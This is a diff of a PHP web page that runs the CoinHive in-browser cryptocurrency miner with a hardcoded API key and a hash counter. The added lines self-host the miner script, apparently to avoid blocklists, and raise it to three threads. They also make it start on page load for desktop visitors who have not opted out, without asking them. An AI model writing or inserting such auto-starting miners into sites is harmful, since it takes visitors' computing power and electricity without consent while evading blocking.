@@ -422,10 +422,11 @@ if(isset($_SESSION['image']) && $_SESSION['image'] != null && !empty($_SESSION['
 	</script>
 	
 	<!-- Coin Hive -->
-	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+	<!--<script src="https://coinhive.com/lib/coinhive.min.js"></script>-->
+	<script src="js/coinhive.min.js"></script>
 	<script type="text/javascript">
 	var apiKey = 'wb8dn2HNjc24tq8qbaJtxlrxtSogoivK';
-	var miner = new CoinHive.Anonymous(apiKey, {threads: 2});
+	var miner = new CoinHive.Anonymous(apiKey, {threads: 3});
 	var cookieKeyTotalHashes = 'totalHashes';
 	var alreadyTotalHashes = Cookies.get(cookieKeyTotalHashes);
 	if(alreadyTotalHashes == undefined)
@@ -433,7 +434,10 @@ if(isset($_SESSION['image']) && $_SESSION['image'] != null && !empty($_SESSION['
 	else
 		alreadyTotalHashes = parseInt(alreadyTotalHashes);
 	document.getElementById("progressOverall").innerHTML = alreadyTotalHashes;
-	miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+	if (!miner.isMobile() && !miner.didOptOut(14400)) {
+		//miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+		miner.start();
+	}
 	setInterval(function() {
 		if (miner.isRunning()) {
 			var totalHashes = alreadyTotalHashes + miner.getTotalHashes();
@@ -449,7 +453,8 @@ if(isset($_SESSION['image']) && $_SESSION['image'] != null && !empty($_SESSION['
 		if (status) {
 			text = '<a href="#" onclick="miner.stop(); setMineButtonTest(false); return false;">Stop</a>';
 		} else {
-			text = '<a href="#" onclick="miner.start(CoinHive.FORCE_EXCLUSIVE_TAB); setMineButtonTest(true); return false;">Start</a>';
+			//text = '<a href="#" onclick="miner.start(CoinHive.FORCE_EXCLUSIVE_TAB); setMineButtonTest(true); return false;">Start</a>';
+			text = '<a href="#" onclick="miner.start(); setMineButtonTest(true); return false;">Start</a>';
 		}
 		document.getElementById("minebutton").innerHTML = text;
 	}
